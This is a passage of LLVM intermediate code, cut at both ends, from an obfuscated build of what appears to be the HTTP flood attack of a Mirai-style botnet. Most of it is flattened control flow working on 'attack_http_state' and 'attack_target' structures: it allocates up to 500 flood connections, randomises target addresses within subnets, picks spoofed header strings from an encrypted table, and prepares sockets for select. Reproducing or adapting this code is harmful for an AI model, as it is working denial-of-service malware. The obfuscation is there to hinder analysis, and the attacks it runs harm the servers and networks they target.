  %122 = load i8, i8* %121, align 1
  %123 = sext i8 %122 to i32
  %124 = icmp sge i32 %123, 97
  %125 = select i1 %124, i32 740521438, i32 -1933638179
  store i32 %125, i32* %switchVar
  br label %loopEnd

; <label>:126:                                    ; preds = %loopEntry
  %127 = load i8*, i8** %15, align 8
  %128 = load i32, i32* %10, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds i8, i8* %127, i64 %129
  %131 = load i8, i8* %130, align 1
  %132 = sext i8 %131 to i32
  %133 = icmp sle i32 %132, 122
  %134 = select i1 %133, i32 1386078753, i32 -1933638179
  store i32 %134, i32* %switchVar
  br label %loopEnd

; <label>:135:                                    ; preds = %loopEntry
  %136 = load i8*, i8** %15, align 8
  %137 = load i32, i32* %10, align 4
  %138 = sext i32 %137 to i64
  %139 = getelementptr inbounds i8, i8* %136, i64 %138
  %140 = load i8, i8* %139, align 1
  %141 = sext i8 %140 to i32
  %142 = sub nsw i32 %141, 32
  %143 = trunc i32 %142 to i8
  store i8 %143, i8* %139, align 1
  store i32 -1933638179, i32* %switchVar
  br label %loopEnd

; <label>:144:                                    ; preds = %loopEntry
  store i32 320221669, i32* %switchVar
  br label %loopEnd

; <label>:145:                                    ; preds = %loopEntry
  %146 = load i32, i32* %10, align 4
  %147 = add nsw i32 %146, 1
  store i32 %147, i32* %10, align 4
  store i32 -1099798423, i32* %switchVar
  br label %loopEnd

; <label>:148:                                    ; preds = %loopEntry
  %149 = load i32, i32* %18, align 4
  %150 = icmp sgt i32 %149, 500
  %151 = select i1 %150, i32 -2057765316, i32 853599956
  store i32 %151, i32* %switchVar
  br label %loopEnd

; <label>:152:                                    ; preds = %loopEntry
  store i32 500, i32* %18, align 4
  store i32 853599956, i32* %switchVar
  br label %loopEnd

; <label>:153:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 36)
  call void @table_unlock_val(i8 zeroext 37)
  call void @table_unlock_val(i8 zeroext 38)
  call void @table_unlock_val(i8 zeroext 39)
  call void @table_unlock_val(i8 zeroext 40)
  call void @table_unlock_val(i8 zeroext 41)
  call void @table_unlock_val(i8 zeroext 42)
  call void @table_unlock_val(i8 zeroext 43)
  call void @table_unlock_val(i8 zeroext 44)
  call void @table_unlock_val(i8 zeroext 45)
  call void @table_unlock_val(i8 zeroext 46)
  %154 = load i32, i32* %18, align 4
  %155 = sext i32 %154 to i64
  %156 = call noalias i8* @calloc(i64 %155, i64 3140) #6
  %157 = bitcast i8* %156 to %struct.attack_http_state*
  store %struct.attack_http_state* %157, %struct.attack_http_state** %13, align 8
  store i32 0, i32* %9, align 4
  store i32 1505780059, i32* %switchVar
  br label %loopEnd

; <label>:158:                                    ; preds = %loopEntry
  %159 = load i32, i32* %9, align 4
  %160 = load i32, i32* %18, align 4
  %161 = icmp slt i32 %159, %160
  %162 = select i1 %161, i32 547567688, i32 -591715310
  store i32 %162, i32* %switchVar
  br label %loopEnd

; <label>:163:                                    ; preds = %loopEntry
  %164 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %165 = load i32, i32* %9, align 4
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %164, i64 %166
  %168 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %167, i32 0, i32 1
  store i8 0, i8* %168, align 4
  %169 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %170 = load i32, i32* %9, align 4
  %171 = sext i32 %170 to i64
  %172 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %169, i64 %171
  %173 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %172, i32 0, i32 0
  store i32 -1, i32* %173, align 4
  %174 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %175 = load i32, i32* %9, align 4
  %176 = load i8, i8* %5, align 1
  %177 = zext i8 %176 to i32
  %178 = srem i32 %175, %177
  %179 = sext i32 %178 to i64
  %180 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %174, i64 %179
  %181 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %180, i32 0, i32 1
  %182 = load i32, i32* %181, align 4
  %183 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %184 = load i32, i32* %9, align 4
  %185 = sext i32 %184 to i64
  %186 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %183, i64 %185
  %187 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %186, i32 0, i32 4
  store i32 %182, i32* %187, align 4
  %188 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %189 = load i32, i32* %9, align 4
  %190 = sext i32 %189 to i64
  %191 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %188, i64 %190
  %192 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %191, i32 0, i32 6
  %193 = getelementptr inbounds [257 x i8], [257 x i8]* %192, i32 0, i32 0
  %194 = load i8*, i8** %17, align 8
  %195 = call i32 @util_strcpy(i8* %193, i8* %194)
  %196 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %197 = load i32, i32* %9, align 4
  %198 = sext i32 %197 to i64
  %199 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %196, i64 %198
  %200 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %199, i32 0, i32 6
  %201 = getelementptr inbounds [257 x i8], [257 x i8]* %200, i64 0, i64 0
  %202 = load i8, i8* %201, align 4
  %203 = sext i8 %202 to i32
  %204 = icmp ne i32 %203, 47
  %205 = select i1 %204, i32 -341624541, i32 -657179373
  store i32 %205, i32* %switchVar
  br label %loopEnd

; <label>:206:                                    ; preds = %loopEntry
  %207 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %208 = load i32, i32* %9, align 4
  %209 = sext i32 %208 to i64
  %210 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %207, i64 %209
  %211 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %210, i32 0, i32 6
  %212 = getelementptr inbounds [257 x i8], [257 x i8]* %211, i32 0, i32 0
  %213 = getelementptr inbounds i8, i8* %212, i64 1
  %214 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %215 = load i32, i32* %9, align 4
  %216 = sext i32 %215 to i64
  %217 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %214, i64 %216
  %218 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %217, i32 0, i32 6
  %219 = getelementptr inbounds [257 x i8], [257 x i8]* %218, i32 0, i32 0
  %220 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %221 = load i32, i32* %9, align 4
  %222 = sext i32 %221 to i64
  %223 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %220, i64 %222
  %224 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %223, i32 0, i32 6
  %225 = getelementptr inbounds [257 x i8], [257 x i8]* %224, i32 0, i32 0
  %226 = call i32 @util_strlen(i8* %225)
  %227 = sext i32 %226 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %213, i8* %219, i64 %227, i32 1, i1 false)
  %228 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %229 = load i32, i32* %9, align 4
  %230 = sext i32 %229 to i64
  %231 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %228, i64 %230
  %232 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %231, i32 0, i32 6
  %233 = getelementptr inbounds [257 x i8], [257 x i8]* %232, i64 0, i64 0
  store i8 47, i8* %233, align 4
  store i32 -657179373, i32* %switchVar
  br label %loopEnd

; <label>:234:                                    ; preds = %loopEntry
  %235 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %236 = load i32, i32* %9, align 4
  %237 = sext i32 %236 to i64
  %238 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %235, i64 %237
  %239 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %238, i32 0, i32 10
  %240 = getelementptr inbounds [9 x i8], [9 x i8]* %239, i32 0, i32 0
  %241 = load i8*, i8** %15, align 8
  %242 = call i32 @util_strcpy(i8* %240, i8* %241)
  %243 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %244 = load i32, i32* %9, align 4
  %245 = sext i32 %244 to i64
  %246 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %243, i64 %245
  %247 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %246, i32 0, i32 9
  %248 = getelementptr inbounds [9 x i8], [9 x i8]* %247, i32 0, i32 0
  %249 = load i8*, i8** %15, align 8
  %250 = call i32 @util_strcpy(i8* %248, i8* %249)
  %251 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %252 = load i32, i32* %9, align 4
  %253 = sext i32 %252 to i64
  %254 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %251, i64 %253
  %255 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %254, i32 0, i32 7
  %256 = getelementptr inbounds [129 x i8], [129 x i8]* %255, i32 0, i32 0
  %257 = load i8*, i8** %16, align 8
  %258 = call i32 @util_strcpy(i8* %256, i8* %257)
  %259 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %260 = load i32, i32* %9, align 4
  %261 = load i8, i8* %5, align 1
  %262 = zext i8 %261 to i32
  %263 = srem i32 %260, %262
  %264 = sext i32 %263 to i64
  %265 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %259, i64 %264
  %266 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %265, i32 0, i32 2
  %267 = load i8, i8* %266, align 4
  %268 = zext i8 %267 to i32
  %269 = icmp slt i32 %268, 32
  %270 = select i1 %269, i32 -144419386, i32 -1658450120
  store i32 %270, i32* %switchVar
  br label %loopEnd

; <label>:271:                                    ; preds = %loopEntry
  %272 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %273 = load i32, i32* %9, align 4
  %274 = load i8, i8* %5, align 1
  %275 = zext i8 %274 to i32
  %276 = srem i32 %273, %275
  %277 = sext i32 %276 to i64
  %278 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %272, i64 %277
  %279 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %278, i32 0, i32 1
  %280 = load i32, i32* %279, align 4
  %281 = call i32 @ntohl(i32 %280) #7
  %282 = call i32 @rand_next()
  %283 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %284 = load i32, i32* %9, align 4
  %285 = load i8, i8* %5, align 1
  %286 = zext i8 %285 to i32
  %287 = srem i32 %284, %286
  %288 = sext i32 %287 to i64
  %289 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %283, i64 %288
  %290 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %289, i32 0, i32 2
  %291 = load i8, i8* %290, align 4
  %292 = zext i8 %291 to i32
  %293 = lshr i32 %282, %292
  %294 = add i32 %281, %293
  %295 = call i32 @htonl(i32 %294) #7
  %296 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %297 = load i32, i32* %9, align 4
  %298 = sext i32 %297 to i64
  %299 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %296, i64 %298
  %300 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %299, i32 0, i32 4
  store i32 %295, i32* %300, align 4
  store i32 -1658450120, i32* %switchVar
  br label %loopEnd

; <label>:301:                                    ; preds = %loopEntry
  %302 = call i32 @rand_next()
  %303 = urem i32 %302, 15
  store i32 %303, i32* %.reg2mem30
  store i32 -991786348, i32* %switchVar
  br label %loopEnd

NodeBlock27:                                      ; preds = %loopEntry
  %.reload46 = load volatile i32, i32* %.reg2mem30
  %Pivot28 = icmp slt i32 %.reload46, 7
  %304 = select i1 %Pivot28, i32 364973715, i32 -1449653198
  store i32 %304, i32* %switchVar
  br label %loopEnd

NodeBlock25:                                      ; preds = %loopEntry
  %.reload38 = load volatile i32, i32* %.reg2mem30
  %Pivot26 = icmp slt i32 %.reload38, 11
  %305 = select i1 %Pivot26, i32 1543641164, i32 927056241
  store i32 %305, i32* %switchVar
  br label %loopEnd

NodeBlock23:                                      ; preds = %loopEntry
  %.reload34 = load volatile i32, i32* %.reg2mem30
  %Pivot24 = icmp slt i32 %.reload34, 13
  %306 = select i1 %Pivot24, i32 -2116971415, i32 1780576684
  store i32 %306, i32* %switchVar
  br label %loopEnd

NodeBlock21:                                      ; preds = %loopEntry
  %.reload32 = load volatile i32, i32* %.reg2mem30
  %Pivot22 = icmp slt i32 %.reload32, 14
  %307 = select i1 %Pivot22, i32 413404987, i32 968188919
  store i32 %307, i32* %switchVar
  br label %loopEnd

LeafBlock19:                                      ; preds = %loopEntry
  %.reload31 = load volatile i32, i32* %.reg2mem30
  %SwitchLeaf20 = icmp eq i32 %.reload31, 14
  %308 = select i1 %SwitchLeaf20, i32 1653272550, i32 1518247315
  store i32 %308, i32* %switchVar
  br label %loopEnd

NodeBlock17:                                      ; preds = %loopEntry
  %.reload33 = load volatile i32, i32* %.reg2mem30
  %Pivot18 = icmp slt i32 %.reload33, 12
  %309 = select i1 %Pivot18, i32 -1702995761, i32 -1538464965
  store i32 %309, i32* %switchVar
  br label %loopEnd

NodeBlock15:                                      ; preds = %loopEntry
  %.reload37 = load volatile i32, i32* %.reg2mem30
  %Pivot16 = icmp slt i32 %.reload37, 9
  %310 = select i1 %Pivot16, i32 -384790996, i32 764164668
  store i32 %310, i32* %switchVar
  br label %loopEnd

NodeBlock13:                                      ; preds = %loopEntry
  %.reload35 = load volatile i32, i32* %.reg2mem30
  %Pivot14 = icmp slt i32 %.reload35, 10
  %311 = select i1 %Pivot14, i32 1481835343, i32 -1212435876
  store i32 %311, i32* %switchVar
  br label %loopEnd

NodeBlock11:                                      ; preds = %loopEntry
  %.reload36 = load volatile i32, i32* %.reg2mem30
  %Pivot12 = icmp slt i32 %.reload36, 8
  %312 = select i1 %Pivot12, i32 1305504577, i32 -857134945
  store i32 %312, i32* %switchVar
  br label %loopEnd

NodeBlock9:                                       ; preds = %loopEntry
  %.reload45 = load volatile i32, i32* %.reg2mem30
  %Pivot10 = icmp slt i32 %.reload45, 3
  %313 = select i1 %Pivot10, i32 1581347151, i32 -2037026411
  store i32 %313, i32* %switchVar
  br label %loopEnd

NodeBlock7:                                       ; preds = %loopEntry
  %.reload41 = load volatile i32, i32* %.reg2mem30
  %Pivot8 = icmp slt i32 %.reload41, 5
  %314 = select i1 %Pivot8, i32 -857218033, i32 -1322681609
  store i32 %314, i32* %switchVar
  br label %loopEnd

NodeBlock5:                                       ; preds = %loopEntry
  %.reload39 = load volatile i32, i32* %.reg2mem30
  %Pivot6 = icmp slt i32 %.reload39, 6
  %315 = select i1 %Pivot6, i32 314629545, i32 670690981
  store i32 %315, i32* %switchVar
  br label %loopEnd

NodeBlock3:                                       ; preds = %loopEntry
  %.reload40 = load volatile i32, i32* %.reg2mem30
  %Pivot4 = icmp slt i32 %.reload40, 4
  %316 = select i1 %Pivot4, i32 -2118928138, i32 1280857773
  store i32 %316, i32* %switchVar
  br label %loopEnd

NodeBlock1:                                       ; preds = %loopEntry
  %.reload44 = load volatile i32, i32* %.reg2mem30
  %Pivot2 = icmp slt i32 %.reload44, 1
  %317 = select i1 %Pivot2, i32 1995311698, i32 -1687362357
  store i32 %317, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload42 = load volatile i32, i32* %.reg2mem30
  %Pivot = icmp slt i32 %.reload42, 2
  %318 = select i1 %Pivot, i32 -1060419243, i32 2023275205
  store i32 %318, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload43 = load volatile i32, i32* %.reg2mem30
  %SwitchLeaf = icmp eq i32 %.reload43, 0
  %319 = select i1 %SwitchLeaf, i32 -808190459, i32 1518247315
  store i32 %319, i32* %switchVar
  br label %loopEnd

; <label>:320:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 47)
  %321 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %322 = load i32, i32* %9, align 4
  %323 = sext i32 %322 to i64
  %324 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %321, i64 %323
  %325 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %324, i32 0, i32 5
  %326 = getelementptr inbounds [512 x i8], [512 x i8]* %325, i32 0, i32 0
  %327 = call i8* @table_retrieve_val(i32 47, i32* null)
  %328 = call i32 @util_strcpy(i8* %326, i8* %327)
  call void @table_lock_val(i8 zeroext 47)
  store i32 1846496582, i32* %switchVar
  br label %loopEnd

; <label>:329:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 48)
  %330 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %331 = load i32, i32* %9, align 4
  %332 = sext i32 %331 to i64
  %333 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %330, i64 %332
  %334 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %333, i32 0, i32 5
  %335 = getelementptr inbounds [512 x i8], [512 x i8]* %334, i32 0, i32 0
  %336 = call i8* @table_retrieve_val(i32 48, i32* null)
  %337 = call i32 @util_strcpy(i8* %335, i8* %336)
  call void @table_lock_val(i8 zeroext 48)
  store i32 1846496582, i32* %switchVar
  br label %loopEnd

; <label>:338:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 49)
  %339 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %340 = load i32, i32* %9, align 4
  %341 = sext i32 %340 to i64
  %342 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %339, i64 %341
  %343 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %342, i32 0, i32 5
  %344 = getelementptr inbounds [512 x i8], [512 x i8]* %343, i32 0, i32 0
  %345 = call i8* @table_retrieve_val(i32 49, i32* null)
  %346 = call i32 @util_strcpy(i8* %344, i8* %345)
  call void @table_lock_val(i8 zeroext 49)
  store i32 1846496582, i32* %switchVar
  br label %loopEnd

; <label>:347:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 50)
  %348 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %349 = load i32, i32* %9, align 4
  %350 = sext i32 %349 to i64
  %351 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %348, i64 %350
  %352 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %351, i32 0, i32 5
  %353 = getelementptr inbounds [512 x i8], [512 x i8]* %352, i32 0, i32 0
  %354 = call i8* @table_retrieve_val(i32 50, i32* null)
  %355 = call i32 @util_strcpy(i8* %353, i8* %354)
  call void @table_lock_val(i8 zeroext 50)
  store i32 1846496582, i32* %switchVar
  br label %loopEnd

; <label>:356:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 51)
  %357 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %358 = load i32, i32* %9, align 4
  %359 = sext i32 %358 to i64
  %360 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %357, i64 %359
  %361 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %360, i32 0, i32 5
  %362 = getelementptr inbounds [512 x i8], [512 x i8]* %361, i32 0, i32 0
  %363 = call i8* @table_retrieve_val(i32 51, i32* null)
  %364 = call i32 @util_strcpy(i8* %362, i8* %363)
  call void @table_lock_val(i8 zeroext 51)
  store i32 1846496582, i32* %switchVar
  br label %loopEnd

; <label>:365:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 52)
  %366 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %367 = load i32, i32* %9, align 4
  %368 = sext i32 %367 to i64
  %369 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %366, i64 %368
  %370 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %369, i32 0, i32 5
  %371 = getelementptr inbounds [512 x i8], [512 x i8]* %370, i32 0, i32 0
  %372 = call i8* @table_retrieve_val(i32 52, i32* null)
  %373 = call i32 @util_strcpy(i8* %371, i8* %372)
  call void @table_lock_val(i8 zeroext 52)
  store i32 1846496582, i32* %switchVar
  br label %loopEnd

; <label>:374:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 53)
  %375 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %376 = load i32, i32* %9, align 4
  %377 = sext i32 %376 to i64
  %378 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %375, i64 %377
  %379 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %378, i32 0, i32 5
  %380 = getelementptr inbounds [512 x i8], [512 x i8]* %379, i32 0, i32 0
  %381 = call i8* @table_retrieve_val(i32 53, i32* null)
  %382 = call i32 @util_strcpy(i8* %380, i8* %381)
  call void @table_lock_val(i8 zeroext 53)
  store i32 1846496582, i32* %switchVar
  br label %loopEnd

; <label>:383:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 54)
  %384 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %385 = load i32, i32* %9, align 4
  %386 = sext i32 %385 to i64
  %387 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %384, i64 %386
  %388 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %387, i32 0, i32 5
  %389 = getelementptr inbounds [512 x i8], [512 x i8]* %388, i32 0, i32 0
  %390 = call i8* @table_retrieve_val(i32 54, i32* null)
  %391 = call i32 @util_strcpy(i8* %389, i8* %390)
  call void @table_lock_val(i8 zeroext 54)
  store i32 1846496582, i32* %switchVar
  br label %loopEnd

; <label>:392:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 55)
  %393 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %394 = load i32, i32* %9, align 4
  %395 = sext i32 %394 to i64
  %396 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %393, i64 %395
  %397 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %396, i32 0, i32 5
  %398 = getelementptr inbounds [512 x i8], [512 x i8]* %397, i32 0, i32 0
  %399 = call i8* @table_retrieve_val(i32 55, i32* null)
  %400 = call i32 @util_strcpy(i8* %398, i8* %399)
  call void @table_lock_val(i8 zeroext 55)
  store i32 1846496582, i32* %switchVar
  br label %loopEnd

; <label>:401:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 56)
  %402 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %403 = load i32, i32* %9, align 4
  %404 = sext i32 %403 to i64
  %405 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %402, i64 %404
  %406 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %405, i32 0, i32 5
  %407 = getelementptr inbounds [512 x i8], [512 x i8]* %406, i32 0, i32 0
  %408 = call i8* @table_retrieve_val(i32 56, i32* null)
  %409 = call i32 @util_strcpy(i8* %407, i8* %408)
  call void @table_lock_val(i8 zeroext 56)
  store i32 1846496582, i32* %switchVar
  br label %loopEnd

; <label>:410:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 57)
  %411 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %412 = load i32, i32* %9, align 4
  %413 = sext i32 %412 to i64
  %414 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %411, i64 %413
  %415 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %414, i32 0, i32 5
  %416 = getelementptr inbounds [512 x i8], [512 x i8]* %415, i32 0, i32 0
  %417 = call i8* @table_retrieve_val(i32 57, i32* null)
  %418 = call i32 @util_strcpy(i8* %416, i8* %417)
  call void @table_lock_val(i8 zeroext 57)
  store i32 1846496582, i32* %switchVar
  br label %loopEnd

; <label>:419:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 58)
  %420 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %421 = load i32, i32* %9, align 4
  %422 = sext i32 %421 to i64
  %423 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %420, i64 %422
  %424 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %423, i32 0, i32 5
  %425 = getelementptr inbounds [512 x i8], [512 x i8]* %424, i32 0, i32 0
  %426 = call i8* @table_retrieve_val(i32 58, i32* null)
  %427 = call i32 @util_strcpy(i8* %425, i8* %426)
  call void @table_lock_val(i8 zeroext 58)
  store i32 1846496582, i32* %switchVar
  br label %loopEnd

; <label>:428:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 59)
  %429 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %430 = load i32, i32* %9, align 4
  %431 = sext i32 %430 to i64
  %432 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %429, i64 %431
  %433 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %432, i32 0, i32 5
  %434 = getelementptr inbounds [512 x i8], [512 x i8]* %433, i32 0, i32 0
  %435 = call i8* @table_retrieve_val(i32 59, i32* null)
  %436 = call i32 @util_strcpy(i8* %434, i8* %435)
  call void @table_lock_val(i8 zeroext 59)
  store i32 1846496582, i32* %switchVar
  br label %loopEnd

; <label>:437:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 60)
  %438 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %439 = load i32, i32* %9, align 4
  %440 = sext i32 %439 to i64
  %441 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %438, i64 %440
  %442 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %441, i32 0, i32 5
  %443 = getelementptr inbounds [512 x i8], [512 x i8]* %442, i32 0, i32 0
  %444 = call i8* @table_retrieve_val(i32 60, i32* null)
  %445 = call i32 @util_strcpy(i8* %443, i8* %444)
  call void @table_lock_val(i8 zeroext 60)
  store i32 1846496582, i32* %switchVar
  br label %loopEnd

; <label>:446:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 61)
  %447 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %448 = load i32, i32* %9, align 4
  %449 = sext i32 %448 to i64
  %450 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %447, i64 %449
  %451 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %450, i32 0, i32 5
  %452 = getelementptr inbounds [512 x i8], [512 x i8]* %451, i32 0, i32 0
  %453 = call i8* @table_retrieve_val(i32 61, i32* null)
  %454 = call i32 @util_strcpy(i8* %452, i8* %453)
  call void @table_lock_val(i8 zeroext 61)
  store i32 1846496582, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 1846496582, i32* %switchVar
  br label %loopEnd

; <label>:455:                                    ; preds = %loopEntry
  %456 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %457 = load i32, i32* %9, align 4
  %458 = sext i32 %457 to i64
  %459 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %456, i64 %458
  %460 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %459, i32 0, i32 6
  %461 = getelementptr inbounds [257 x i8], [257 x i8]* %460, i32 0, i32 0
  %462 = load i8*, i8** %17, align 8
  %463 = call i32 @util_strcpy(i8* %461, i8* %462)
  store i32 -691582349, i32* %switchVar
  br label %loopEnd

; <label>:464:                                    ; preds = %loopEntry
  %465 = load i32, i32* %9, align 4
  %466 = add nsw i32 %465, 1
  store i32 %466, i32* %9, align 4
  store i32 1505780059, i32* %switchVar
  br label %loopEnd

; <label>:467:                                    ; preds = %loopEntry
  store i32 1290577000, i32* %switchVar
  br label %loopEnd

; <label>:468:                                    ; preds = %loopEntry
  store i32 0, i32* %23, align 4
  %469 = call i64 @time(i64* null) #6
  %470 = trunc i64 %469 to i32
  store i32 %470, i32* %27, align 4
  store i32 -1408984491, i32* %switchVar
  br label %loopEnd

; <label>:471:                                    ; preds = %loopEntry
  %472 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %473 = getelementptr inbounds [16 x i64], [16 x i64]* %472, i64 0, i64 0
  %474 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %473) #6, !srcloc !1
  %475 = extractvalue { i64, i64* } %474, 0
  %476 = extractvalue { i64, i64* } %474, 1
  %477 = trunc i64 %475 to i32
  store i32 %477, i32* %28, align 4
  %478 = ptrtoint i64* %476 to i64
  %479 = trunc i64 %478 to i32
  store i32 %479, i32* %29, align 4
  store i32 -803206422, i32* %switchVar
  br label %loopEnd

; <label>:480:                                    ; preds = %loopEntry
  store i32 182095538, i32* %switchVar
  br label %loopEnd

; <label>:481:                                    ; preds = %loopEntry
  %482 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %483 = getelementptr inbounds [16 x i64], [16 x i64]* %482, i64 0, i64 0
  %484 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %483) #6, !srcloc !2
  %485 = extractvalue { i64, i64* } %484, 0
  %486 = extractvalue { i64, i64* } %484, 1
  %487 = trunc i64 %485 to i32
  store i32 %487, i32* %30, align 4
  %488 = ptrtoint i64* %486 to i64
  %489 = trunc i64 %488 to i32
  store i32 %489, i32* %31, align 4
  store i32 -1380624900, i32* %switchVar
  br label %loopEnd

; <label>:490:                                    ; preds = %loopEntry
